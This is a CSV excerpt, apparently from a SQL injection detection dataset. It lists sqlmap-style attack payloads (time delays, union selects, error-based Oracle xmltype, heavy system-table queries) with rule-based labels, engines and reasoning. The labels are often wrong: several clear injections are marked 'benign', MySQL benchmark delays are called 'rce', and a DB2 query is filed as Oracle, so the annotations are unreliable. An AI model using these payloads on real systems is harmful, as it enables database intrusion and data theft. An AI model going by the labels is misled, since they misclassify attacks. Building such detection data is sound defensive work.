row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
3960,"1"" ) where 2215 = 2215 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
3961,1 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) # bkjl,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3962,1 ) as ilqx where 8547 = 8547,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3963,"1"" ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3964,"1' ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3965,"1"" ) where 6236 = 6236 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,,rce,generic,0.95,0x544d5a4c detected — rce injection (priority 1) on generic,rule-based
3966,"1"" ) ) and ( 7467 = 7962 ) *7962 and ( ( ""nhld"" = ""nhld",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
3967,1 ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 6062 = 6062,1,,boolean_blind,firebird,0.95,) and ( detected — boolean_blind injection (priority 8) on firebird,rule-based
3968,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( 'xiyl' like 'xiyl",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
3969,select ( case when ( 7852 = 7476 ) then 7852 else 7852* ( select 7852 from mysql.db ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3970,1' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( 'eqfh' = 'eqfh,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3971,"-1475"" ) union all select 8611,8611,8611#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3972,"1' ) as saqp where 6612 = 6612 union all select null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3973,"1' ) ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
3974,select ( case when ( 5752 = 6036 ) then 1 else 5752* ( select 5752 from master..sysdatabases ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3975,1'|| ( select 'sbft' where 8748 = 8748,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3976,"1"" ) where 2180 = 2180 and make_set ( 8403 = 8403,8899 ) --",1,,boolean_blind,generic,0.95,2180 = 2180 and detected — boolean_blind injection (priority 8) on generic,rule-based
3977,"-7194'|| ( select 'gbrx' from dual where 6205 = 6205 union all select 6205,6205,6205,6205,6205,6205,6205#",1,,union_based,oracle,0.95,"union all select, union all select detected — union_based injection (priority 7) on oracle",rule-based
3978,"1"" where 8089 = 8089",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3979,-2936 ) or 6872 = 6872,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3980,"1'|| ( select 'ryom' where 1134 = 1134 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,,boolean_blind,generic,0.95,1134 = 1134 or detected — boolean_blind injection (priority 8) on generic,rule-based
3981,"1%' ) ) ) union all select null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3982,"1'|| ( select 'xjtq' from dual where 5719 = 5719 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) ||'",1,,heavy_query,oracle,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on oracle",rule-based
3983,"1%"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""%"" = """,1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
